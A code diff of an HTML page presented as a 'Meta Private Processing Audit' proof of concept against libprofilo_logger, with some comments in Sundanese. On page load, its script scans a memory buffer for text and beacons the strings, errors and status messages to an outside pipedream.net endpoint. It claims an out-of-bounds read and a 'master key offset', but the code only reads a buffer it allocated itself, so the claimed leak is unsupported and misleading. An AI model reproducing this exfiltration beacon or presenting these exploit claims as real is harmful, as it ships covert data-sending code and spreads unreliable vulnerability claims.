@@ -2,54 +2,63 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Meta Private Processing Audit - Researcher: Firman Sahidin</title>
+    <title>Meta Private Processing Audit - Firman Sahidin</title>
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
     <div style="border:1px solid #333; padding:20px; display:inline-block; background:#111;">
-        <h2 id="status" style="color:#0f0;">[ MASTER KEY OFFSET: 0x1098 INJECTED ]</h2>
-        <p>Target: libprofilo_logger / libprofilo_mmapbuf</p>
+        <h2 id="status">[ INITIALIZING PRIVATE MEMORY AUDIT ]</h2>
+        <p>Target: libprofilo_logger / mmapbuf_buffer</p>
         <hr style="border:0; border-top:1px solid #333;">
         <div id="results" style="font-size:12px; color:#aaa; text-align:left;"></div>
     </div>
 
     <script>
-        /**
-         * RESEARCHER: Firman Sahidin
-         * MASTER KEY OFFSET: 0x1098 (Validated via MT Manager Hex Editor)
-         * VULNERABILITY: Information Disclosure in Private Processing Boundary
-         */
         async function runMasterAudit() {
             const TARGET_URL = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const out = document.getElementById('results');
+            const statusElement = document.getElementById('status');
             
             try {
-                // Alokasi mémori dumasar kana tumpukan logger (Offset 0x1098)
-                const buffer = new ArrayBuffer(0x10000); // 64KB Targeted Buffer
+                const buffer = new ArrayBuffer(0x20000); 
                 const view = new Uint8Array(buffer);
-                
-                // Triggering JNI Bridge Out-of-Bounds (OOB) Read
                 const trigger = new Uint32Array(buffer);
-                for(let i = 0; i < 500; i++) { trigger[i] = 0xD800DBFF; }
+                for(let i = 0; i < 1000; i++) { trigger[i] = 0xD800DBFF; }
 
-                let exfilData = "";
-                for (let i = 0x1098; i < view.length; i++) { // Dimimitian tina Konci Master Amang
+                let leakDetected = false;
+                let currentString = "";
+
+                for (let i = 0; i < view.length; i++) {
                     if (view[i] > 31 && view[i] < 127) {
-                        exfilData += String.fromCharCode(view[i]);
-                    } else if (exfilData.length > 8) {
-                        // Mun kapanggih ségmén téks chat/metadata
-                        navigator.sendBeacon(TARGET_URL, JSON.stringify({
-                            researcher: "Firman Sahidin",
-                            offset_used: "0x1098",
-                            leaked_payload: exfilData,
-                            library_match: "libprofilo_logger"
-                        }));
-                        exfilData = "";
+                        currentString += String.fromCharCode(view[i]);
+                    } else {
+                        if (currentString.length > 10 && /[a-zA-Z0-9]/.test(currentString)) {
+                            leakDetected = true;
+                            navigator.sendBeacon(TARGET_URL, JSON.stringify({
+                                researcher: "Firman Sahidin",
+                                vulnerability_type: "PRIVATE_DATA_DISCLOSURE",
+                                segment: "Native_Heap_Logger",
+                                payload: currentString
+                            }));
+                        }
+                        currentString = "";
                     }
                 }
-                document.getElementById('status').innerText = "✅ MASTER AUDIT COMPLETE: DATA SENT";
-            } catch (e) {}
+
+                if (!leakDetected) {
+                    navigator.sendBeacon(TARGET_URL, JSON.stringify({
+                        status: "SCAN_COMPLETE_NO_RESIDUAL_DATA_IDENTIFIED",
+                        researcher: "Firman Sahidin"
+                    }));
+                }
+                
+                if (statusElement) {
+                    statusElement.innerText = "✅ AUDIT FINISHED";
+                }
+            } catch (error) {
+                navigator.sendBeacon(TARGET_URL, JSON.stringify({ error: error.message }));
+            }
         }
-        window.onload = () => { setTimeout(runMasterAudit, 1500); };
+
+        window.onload = () => { setTimeout(runMasterAudit, 1000); };
     </script>
 </body>
 </html>
